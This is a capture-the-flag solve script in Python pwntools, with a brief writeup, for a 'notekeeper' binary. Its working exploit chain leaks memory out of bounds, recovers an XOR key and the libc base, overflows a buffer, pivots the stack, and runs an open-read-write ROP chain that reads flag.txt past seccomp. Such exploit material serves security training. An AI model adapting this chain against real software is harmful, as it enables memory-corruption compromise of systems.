#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

exe = ELF('./notekeeper_patched')
libc = ELF('./libc.so.6')
context.binary = exe

def add_note(p, title, body):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'Title: ', title)
    p.sendafter(b'Body: ', body)

def edit_note(p, idx, size, body):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b': ', body)
    p.sendlineafter(b': ', str(size).encode())

def feedback(p, data):
    p.sendlineafter(b'> ', b'4')
    p.sendafter(b'Feedback: ', data)

p = process("./notekeeper_patched")

add_note(p, b"dummy\x00", b"A" * 0x3f)
edit_note(p, 0, 410, b"A\n")

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Index: ', b'0')
p.recvuntil(b'Body (hex):\n')

data = p.recvuntil(b'=== notekeeper ===', drop=True)
hex_str = data.replace(b'\n', b'').replace(b' ', b'').decode()
leaked_bytes = bytes.fromhex(hex_str)

xor_key = leaked_bytes[384] ^ 0xa8
log.success(f"Recovered XOR Key: {hex(xor_key)}")

decrypted = bytes([b ^ xor_key for b in leaked_bytes])

libc_leak = u64(decrypted[392:400])
libc.address = libc_leak - libc.libc_start_main_return
log.success(f"Libc Base: {hex(libc.address)}")

libc_bss = libc.bss() + 0x1000
pivot_rop = ROP(libc)

pivot_rop.read(0, libc_bss, 0x500)
pivot_rop.raw(pivot_rop.find_gadget(['pop rsp', 'ret'])[0])
pivot_rop.raw(libc_bss)

payload = b"A" * 56 + pivot_rop.chain()
payload = payload.ljust(152, b"A")

feedback(p, payload)

orw_rop = ROP(libc)
libc_syscall = orw_rop.find_gadget(['syscall', 'ret'])[0]

strings_offset = 0x200
flag_str_addr = libc_bss + strings_offset
read_buffer = libc_bss + 0x300

orw_rop(rdi=flag_str_addr, rsi=0, rax=2)
orw_rop.raw(libc_syscall)

orw_rop(rdi=3, rsi=read_buffer, rdx=0x100, rax=0)
orw_rop.raw(libc_syscall)

orw_rop(rdi=1, rsi=read_buffer, rdx=0x100, rax=1)
orw_rop.raw(libc_syscall)

orw_rop(rdi=0, rax=60)
orw_rop.raw(libc_syscall)

chain = orw_rop.chain()
chain = chain.ljust(strings_offset, b"\x00")
chain += b"flag.txt\x00"
chain = chain.ljust(0x500, b"\x00")

p.send(chain)

output = p.recvall().decode()
print(output)


"""
FAST WRITEUP

First of all this is so easy challenge

First the first bug is in edit function that will help us leak and bypass xor via oob

Why 410 ?

because in gdb when you examin the memory before xor at 410 you will find address needed to leak so there were an address that has LSB 0xa8 that does not change so when i get the value xored and the result i can get the key 
then i will leak the libc which is the core thing

Second bug

Buffer overflow in feedback
The first problem is there is seccomp so i can not execute normal rop i need a rop chain called ORW to get the flag
The second problem there is no enough space for ORW rop chain

The solve is simply to use the small space to make a rop chain which do 2 things

take input from me put it in safe place in libc.bss after 0x1000 to avoid overwriting of libc active data
and it will change the stack pointer to point at it so it execute the ORW rop chain

Thats it
"""
